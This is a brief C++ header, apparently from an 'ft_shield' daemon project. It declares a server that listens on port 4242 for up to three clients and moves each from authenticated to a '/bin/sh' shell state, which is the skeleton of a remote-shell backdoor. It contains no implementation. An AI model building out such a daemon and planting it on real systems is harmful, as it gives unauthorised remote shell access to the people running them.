#pragma once

#include <shield/daemon.hpp>

#define MAX_CLIENTS 3
#define FT_SHIELD_PORT 4242
#define SHELL "/bin/sh" 

enum class e_client_state
{
	CLIENT_STATE_CONNECTED,
	CLIENT_STATE_AUTHENTICATED,
	CLIENT_STATE_SHELL,
	CLIENT_STATE_DROPPED,
};

typedef struct s_client
{
	int							fd;
	enum class e_client_state	state;
	time_t	last_seen;
}	t_client;

typedef struct s_server_info
{

}		t_server_info;

class DaemonServer {

	private:
		t_client client_list[MAX_CLIENTS];


	public:
		DaemonServer();
		~DaemonServer();
		int init();
		void run();
};